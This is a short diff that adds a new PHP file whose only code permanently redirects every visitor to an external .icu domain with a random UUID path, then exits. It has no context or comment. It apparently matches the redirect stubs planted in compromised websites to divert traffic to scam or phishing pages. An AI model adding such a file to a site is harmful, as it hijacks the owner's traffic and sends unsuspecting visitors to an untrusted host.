@@ -1,0 +1,5 @@
+<?php
+header('HTTP/1.1 301 Moved Permanently');
+header('Location: https://exists-mazard.icu/50fa1929-38fc-4848-83c6-8064d3ab22e7'); exit;
+
+
